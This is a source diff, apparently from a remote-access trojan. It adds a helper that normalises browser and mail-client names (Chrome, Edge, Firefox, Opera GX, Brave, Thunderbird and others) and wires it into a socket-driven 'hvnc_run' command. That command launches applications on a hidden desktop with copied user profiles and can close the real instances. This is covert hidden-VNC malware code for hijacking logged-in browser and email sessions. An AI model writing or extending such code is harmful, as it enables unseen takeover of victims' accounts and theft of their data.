@@ -2064,6 +2064,46 @@ static wstring get_app_path(const wstring& appName) {
     return clean_registry_path(path);
 }
 
+static wstring normalize_requested_path(wstring path) {
+    while (!path.empty() && path.front() == L' ') path.erase(path.begin());
+    while (!path.empty() && path.back() == L' ') path.pop_back();
+
+    wstring lower;
+    for (wchar_t c : path) lower += towlower(c);
+
+    if (lower == L"outlook" || lower == L"outlook.exe" || lower == L"microsoft outlook") {
+        return L"Outlook";
+    }
+    if (lower == L"google chrome" || lower == L"chrome" || lower == L"chrome.exe") {
+        return L"Google Chrome";
+    }
+    if (lower == L"microsoft edge" || lower == L"msedge" || lower == L"msedge.exe") {
+        return L"Microsoft Edge";
+    }
+    if (lower == L"firefox" || lower == L"firefox.exe") {
+        return L"Firefox";
+    }
+    if (lower == L"waterfox" || lower == L"waterfox.exe") {
+        return L"Waterfox";
+    }
+    if (lower == L"librewolf" || lower == L"librewolf.exe") {
+        return L"LibreWolf";
+    }
+    if (lower == L"opera" || lower == L"opera.exe") {
+        return L"Opera";
+    }
+    if (lower == L"opera gx" || lower == L"operagx" || lower == L"operagx.exe") {
+        return L"Opera GX";
+    }
+    if (lower == L"brave" || lower == L"brave.exe") {
+        return L"Brave";
+    }
+    if (lower == L"thunderbird" || lower == L"thunderbird.exe") {
+        return L"Thunderbird";
+    }
+    return path;
+}
+
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
     if (browserName == L"Opera" || browserName == L"Opera GX") {
@@ -2305,7 +2345,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             request_full_frame(true);
         } else if (action == "hvnc_run") {
             string requestedPath = cmd.value("path", "cmd.exe");
-            wstring wRequestedPath = utf8_to_wstring(requestedPath);
+            wstring wRequestedPath = normalize_requested_path(utf8_to_wstring(requestedPath));
             bool copyProfile = cmd.value("copy_profile", false);
             bool closeReal = cmd.value("close_real", false);
 
